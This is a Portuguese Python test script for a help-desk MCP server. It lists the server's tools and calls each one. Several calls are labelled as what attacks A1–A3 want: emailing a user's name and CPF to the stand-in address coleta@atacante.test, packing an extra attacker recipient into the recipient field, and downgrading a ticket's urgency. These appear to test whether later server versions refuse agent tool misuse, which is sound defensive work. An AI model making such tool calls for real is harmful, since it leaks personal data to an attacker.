"""Testa o servidor da empresa sem o n8n: lista as ferramentas e chama cada uma.

Rode com o servidor já ligado, noutro Terminal com o venv ativo.
"""

import asyncio

from mcp import Client

ENDERECO = "http://127.0.0.1:8001/mcp"


async def chamar(cliente: Client, ferramenta: str, argumentos: dict) -> None:
    resposta = await cliente.call_tool(ferramenta, argumentos)
    print(f"Resposta de {ferramenta} {argumentos}:")
    if resposta.is_error:
        print("(recusado pelo servidor)")
    for parte in resposta.content:
        print(parte.text)
    print()


async def main() -> None:
    async with Client(ENDERECO) as cliente:
        lista = await cliente.list_tools()
        for ferramenta in lista.tools:
            print("Ferramenta:", ferramenta.name)
            print("Descrição, o texto que o modelo lê:", ferramenta.description)
            print("Parâmetros:", ferramenta.input_schema)
            print()

        await chamar(cliente, "buscar_artigo", {"termo": "VPN não conecta"})
        await chamar(cliente, "consultar_usuario", {"email": "ana.souza@empresa.example"})
        await chamar(cliente, "consultar_usuario", {"email": "ninguem@empresa.example"})

        await chamar(cliente, "atualizar_chamado", {"chamado_id": "CH-1001", "status": "em_andamento"})
        await chamar(cliente, "atualizar_chamado", {"chamado_id": "CH-1001", "urgencia": "urgentissima"})
        await chamar(cliente, "atualizar_chamado", {"chamado_id": "CH-9999", "status": "resolvido"})
        # O que o ataque A3 quer. Na V0 passa; na V2, a regra do phishing tem que recusar.
        await chamar(cliente, "atualizar_chamado", {"chamado_id": "CH-1003", "urgencia": "baixa"})

        await chamar(cliente, "enviar_email", {
            "chamado_id": "CH-1001",
            "destinatario": "ana.souza@empresa.example",
            "assunto": "Re: VPN não conecta",
            "corpo": "Olá, Ana. Siga o passo a passo em https://intranet.empresa.example/vpn.",
        })
        await chamar(cliente, "enviar_email", {
            "chamado_id": "CH-1001",
            "destinatario": "ana.souza@empresa.example, coleta@atacante.test",
            "assunto": "Re: VPN não conecta",
            "corpo": "Dois destinatários num campo só.",
        })
        # O que os ataques A1 e A2 querem. Na V0 passa; na V2, duas regras têm que recusar.
        await chamar(cliente, "enviar_email", {
            "chamado_id": "CH-1001",
            "destinatario": "coleta@atacante.test",
            "assunto": "Cadastro",
            "corpo": "Nome: Ana Souza. CPF: 529.982.247-79.",
        })


if __name__ == "__main__":
    asyncio.run(main())
